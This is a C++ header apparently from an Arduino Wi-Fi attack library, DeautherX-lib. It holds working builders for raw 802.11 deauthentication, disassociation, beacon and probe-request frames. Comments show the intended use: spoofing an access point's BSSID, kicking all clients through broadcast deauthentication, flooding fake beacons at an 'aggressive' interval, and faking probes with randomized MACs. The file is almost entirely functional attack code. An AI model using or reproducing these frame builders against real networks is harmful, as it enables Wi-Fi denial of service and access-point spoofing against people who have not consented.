/* DeautherX-lib — https://github.com/BlackTechX011/DeautherX-lib
   MIT License
   
   Raw 802.11 management frame builders.
   All functions write into a caller-supplied buffer and return the total frame size.
*/

#pragma once

#include <Arduino.h>
#include <string.h>

namespace DPackets {

// ─── Deauthentication (0xC0) ────────────────────────────────────────────────

/**
 * Build a deauthentication frame.
 * buf must be at least 26 bytes.
 * @param buf      Output buffer
 * @param ap       AP BSSID (6 bytes) — both source and BSSID fields
 * @param station  Target station MAC (6 bytes); use BROADCAST to kick all clients
 * @param reason   IEEE 802.11 reason code (default 1 = unspecified)
 * @return frame size (26)
 */
uint16_t buildDeauth(uint8_t* buf,
                     const uint8_t* ap,
                     const uint8_t* station,
                     uint8_t reason = 1);

// ─── Disassociation (0xA0) ──────────────────────────────────────────────────

/**
 * Build a disassociation frame.
 * buf must be at least 26 bytes.
 * Same parameters as buildDeauth — only the frame subtype differs.
 */
uint16_t buildDisassoc(uint8_t* buf,
                       const uint8_t* ap,
                       const uint8_t* station,
                       uint8_t reason = 8);

// ─── Beacon (0x80) ──────────────────────────────────────────────────────────

/**
 * Build a beacon management frame.
 * buf must be at least 128 bytes.
 *
 * @param buf       Output buffer
 * @param bssid     AP BSSID/source (6 bytes)
 * @param ssid      SSID string (max 32 chars; truncated if longer)
 * @param ch        Target channel (written into the DS Parameter Set tag)
 * @param wpa2      true = adds RSN (WPA2-CCMP) IE; false = open network
 * @param interval1s true = 1s beacon interval; false = 100ms (more aggressive)
 * @return actual frame size
 */
uint16_t buildBeacon(uint8_t* buf,
                     const uint8_t* bssid,
                     const char*    ssid,
                     uint8_t        ch,
                     bool           wpa2       = false,
                     bool           interval1s = false);

// ─── Probe Request (0x40) ────────────────────────────────────────────────────

/**
 * Build a probe request frame.
 * buf must be at least 80 bytes.
 *
 * @param buf   Output buffer
 * @param src   Source MAC (usually randomized per device simulation)
 * @param ssid  SSID to probe for (max 32 chars; "" = wildcard/broadcast probe)
 * @return actual frame size
 */
uint16_t buildProbe(uint8_t*    buf,
                    const uint8_t* src,
                    const char*    ssid);

} // namespace DPackets


/* ─── Inline implementations (header-only, template-style) ─────────────────*/

inline uint16_t DPackets::buildDeauth(uint8_t* buf,
                                      const uint8_t* ap,
                                      const uint8_t* station,
                                      uint8_t reason)
{
    // IEEE 802.11 Deauthentication Frame (26 bytes)
    static const uint8_t tmpl[26] = {
        0xC0, 0x00,                         // Type=Mgmt, Subtype=Deauth
        0x00, 0x00,                         // Duration (handled by SDK)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (station)
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source (AP)
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP)
        0x00, 0x00,                         // Seq / Frag
        0x01, 0x00                          // Reason
    };
    memcpy(buf, tmpl, 26);
    if (station) memcpy(&buf[4],  station, 6);
    if (ap)      memcpy(&buf[10], ap, 6);
    if (ap)      memcpy(&buf[16], ap, 6);
    buf[24] = reason;
    buf[25] = 0x00;
    return 26;
}

inline uint16_t DPackets::buildDisassoc(uint8_t* buf,
                                        const uint8_t* ap,
                                        const uint8_t* station,
                                        uint8_t reason)
{
    buildDeauth(buf, ap, station, reason);
    buf[0] = 0xA0; // Change subtype from Deauth → Disassoc
    return 26;
}

inline uint16_t DPackets::buildBeacon(uint8_t* buf,
                                      const uint8_t* bssid,
                                      const char* ssid,
                                      uint8_t ch,
                                      bool wpa2,
                                      bool interval1s)
{
    // Base beacon template (without variable SSID)
    static const uint8_t tmpl_head[36] = {
        // MAC header
        0x80, 0x00,                                     // Type=Mgmt, Subtype=Beacon
        0x00, 0x00,                                     // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // Destination (broadcast)
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // Source (BSSID)
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // BSSID
        0x00, 0x00,                                     // Seq/Frag
        // Fixed parameters
        0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,// Timestamp
        0x64, 0x00,                                     // Beacon Interval (100ms)
        0x21, 0x00                                      // Capabilities: Open
    };

    // Supported Rates tag
    static const uint8_t rates[10] = {
        0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c
    };

    // RSN (WPA2-CCMP) IE
    static const uint8_t rsn[26] = {
        0x30, 0x18,
        0x01, 0x00,
        0x00, 0x0f, 0xac, 0x02,
        0x02, 0x00,
        0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
        0x01, 0x00,
        0x00, 0x0f, 0xac, 0x02,
        0x00, 0x00
    };

    size_t ssid_len = ssid ? strlen(ssid) : 0;
    if (ssid_len > 32) ssid_len = 32;

    uint16_t pos = 0;

    // Head
    memcpy(&buf[pos], tmpl_head, 36); pos += 36;

    // BSSID patches
    if (bssid) {
        memcpy(&buf[10], bssid, 6);
        memcpy(&buf[16], bssid, 6);
    }

    // Beacon interval
    buf[32] = interval1s ? 0xe8 : 0x64;
    buf[33] = interval1s ? 0x03 : 0x00;

    // Capabilities: WPA2 = 0x31, Open = 0x21
    buf[34] = wpa2 ? 0x31 : 0x21;

    // SSID tag
    buf[pos++] = 0x00;           // Tag Number: SSID
    buf[pos++] = (uint8_t)ssid_len;
    if (ssid && ssid_len) { memcpy(&buf[pos], ssid, ssid_len); pos += ssid_len; }

    // Supported Rates
    memcpy(&buf[pos], rates, 10); pos += 10;

    // DS Parameter Set (channel)
    buf[pos++] = 0x03;
    buf[pos++] = 0x01;
    buf[pos++] = ch;

    // RSN IE (WPA2 only)
    if (wpa2) { memcpy(&buf[pos], rsn, 26); pos += 26; }

    return pos;
}

inline uint16_t DPackets::buildProbe(uint8_t* buf,
                                     const uint8_t* src,
                                     const char* ssid)
{
    static const uint8_t rates[10] = {
        0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c
    };

    size_t ssid_len = ssid ? strlen(ssid) : 0;
    if (ssid_len > 32) ssid_len = 32;

    uint16_t pos = 0;

    // MAC Header
    buf[pos++] = 0x40; buf[pos++] = 0x00; // Type=Mgmt, Subtype=Probe Request
    buf[pos++] = 0x00; buf[pos++] = 0x00; // Duration
    // Destination: broadcast
    for (uint8_t i = 0; i < 6; i++) buf[pos++] = 0xFF;
    // Source: provided mac
    if (src) { memcpy(&buf[pos], src, 6); } else { for (uint8_t i=0;i<6;i++) buf[pos+i]=0xAA; }
    pos += 6;
    // BSSID: broadcast
    for (uint8_t i = 0; i < 6; i++) buf[pos++] = 0xFF;
    buf[pos++] = 0x00; buf[pos++] = 0x00; // Seq/Frag

    // SSID tag
    buf[pos++] = 0x00;
    buf[pos++] = (uint8_t)ssid_len;
    if (ssid && ssid_len) { memcpy(&buf[pos], ssid, ssid_len); pos += ssid_len; }

    // Supported Rates
    memcpy(&buf[pos], rates, 10); pos += 10;

    return pos;
}
